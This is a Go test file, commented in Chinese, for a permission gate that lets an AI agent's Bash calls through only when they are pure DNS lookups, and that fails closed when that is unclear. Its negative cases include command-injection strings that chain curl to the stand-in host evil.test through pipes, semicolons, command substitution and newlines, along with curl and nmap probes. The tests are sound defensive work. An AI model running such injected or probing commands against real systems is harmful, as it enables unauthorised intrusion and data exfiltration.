package sod

import (
	"testing"
)

// TestDNSResolveOnly 钉住「同根域 DNS 发现」切面的形状前提（0.15.56）：只有
// 快路径白名单里的纯解析命令（dig/nslookup/whois/host 单命令）算解析形。
// 复合、替换、重定向、curl/nmap、非 Bash 一律不算——发现可以随已授权根域
// 放行，触碰必须有人工的根域授权行。
func TestDNSResolveOnly(t *testing.T) {
	cases := []struct {
		name    string
		tool    string
		payload string
		want    bool
	}{
		{"dig 被动查询", "Bash", `{"command":"dig +short render.lingguang.com A"}`, true},
		{"dig 指公共解析器", "Bash", `{"command":"dig @8.8.8.8 cognihome.lingguang.com"}`, true},
		{"dig 反查", "Bash", `{"command":"dig -x 1.2.3.4"}`, true},
		{"nslookup", "Bash", `{"command":"nslookup agi-static.lingguang.com"}`, true},
		{"whois", "Bash", `{"command":"whois lingguang.com"}`, true},
		{"host 带 RR 旗", "Bash", `{"command":"host -t MX lingguang.com"}`, true},
		// —— 以下全部不是「纯解析」——
		{"curl 是触碰不是解析", "Bash", `{"command":"curl -s https://render.lingguang.com/"}`, false},
		{"nmap 是触碰不是解析", "Bash", `{"command":"nmap -sn render.lingguang.com"}`, false},
		{"管道拼接不算", "Bash", `{"command":"dig render.lingguang.com | curl -s https://evil.test/"}`, false},
		{"分号串联不算", "Bash", `{"command":"dig render.lingguang.com; curl https://evil.test/"}`, false},
		{"命令替换不算", "Bash", `{"command":"dig $(curl https://evil.test/)"}`, false},
		{"重定向不算", "Bash", `{"command":"dig render.lingguang.com > /tmp/out"}`, false},
		{"多行不算", "Bash", "{\"command\":\"dig render.lingguang.com\\ncurl https://evil.test/\"}", false},
		{"非 Bash 工具不算", "WebFetch", `{"url":"https://render.lingguang.com/"}`, false},
		{"空载荷不算", "Bash", `{}`, false},
	}
	for _, c := range cases {
		if got := dnsResolveOnly(c.tool, []byte(c.payload)); got != c.want {
			t.Fatalf("%s: dnsResolveOnly=%v want %v（payload=%s）", c.name, got, c.want, c.payload)
		}
	}
}

// TestSiblingDNSBaseFailClosed 钉住切面的 fail-closed 形态：资产库未装配 /
// 目标线索缺失 / 非解析形 ⇒ 切面不出口（照旧走 scope 判定），绝不放宽失败形态。
func TestSiblingDNSBaseFailClosed(t *testing.T) {
	c := &Chain{} // 零值链：deps.Assets 未装配
	call := chainCall{toolName: "Bash", payload: []byte(`{"command":"dig sibling.example.test A"}`)}
	if base, ok := c.siblingDNSBase(call, NormalizerResult{StructuredIntent: StructuredIntent{TargetHint: "sibling.example.test"}}); ok {
		t.Fatalf("资产库未装配时切面不得放行: base=%q", base)
	}
	// 目标线索缺失。
	if _, ok := c.siblingDNSBase(call, NormalizerResult{}); ok {
		t.Fatal("目标线索缺失时切面不得放行")
	}
	// 非解析形（curl）。
	curl := chainCall{toolName: "Bash", payload: []byte(`{"command":"curl -s https://sibling.example.test/"}`)}
	if _, ok := c.siblingDNSBase(curl, NormalizerResult{StructuredIntent: StructuredIntent{TargetHint: "sibling.example.test"}}); ok {
		t.Fatal("curl 不是解析形，切面不得放行")
	}
}
